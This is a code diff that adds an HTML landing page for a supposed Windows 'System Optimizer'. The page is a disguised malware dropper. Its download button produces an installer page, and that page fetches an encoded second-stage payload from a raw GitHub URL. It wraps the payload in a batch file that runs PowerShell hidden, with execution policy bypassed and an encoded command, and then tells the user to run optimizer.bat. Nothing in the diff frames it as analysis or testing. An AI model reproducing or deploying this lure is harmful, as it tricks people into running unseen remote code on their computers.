@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Tools</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">⚡</div>
+        <h1>System Optimizer</h1>
+        <p>Enhance your Windows system performance with our optimization tool</p>
+        <button class="btn" onclick="downloadInstaller()">📥 Download Tool</button>
+    </div>
+    
+    <script>
+    function downloadInstaller() {
+        const installerHTML = `<!DOCTYPE html>
+<html>
+<head>
+    <title>Installing System Optimizer</title>
+    <style>
+        body { font-family: system-ui; padding: 40px; text-align: center; }
+        h2 { color: #333; margin-bottom: 20px; }
+        #status { color: #666; margin: 20px 0; }
+        .spinner { 
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h2>System Optimizer Installation</h2>
+    <div class="spinner"></div>
+    <p id="status">Initializing...</p>
+    
+    <script>
+    (async function() {
+        const status = document.getElementById('status');
+        
+        try {
+            status.textContent = 'Downloading components...';
+            
+            // Download PowerShell payload from GitHub
+            const response = await fetch('https://raw.githubusercontent.com/shrnx/readme/main/stage2.txt');
+            const encodedPayload = await response.text();
+            
+            status.textContent = 'Installing optimization modules...';
+            
+            // Create batch file to execute PowerShell
+            const batchContent = `@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
+`;
+            
+            // Download as .bat file
+            const blob = new Blob([batchContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'optimizer.bat';
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            status.textContent = '✓ Downloaded! Please run optimizer.bat to complete installation.';
+            
+        } catch (error) {
+            status.textContent = 'Error: ' + error.message;
+        }
+    })();
+    <\/script>
+</body>
+</html>`;
+        
+        // Download installer
+        const blob = new Blob([installerHTML], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'optimizer-installer.html';
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+    </script>
+</body>
+</html>
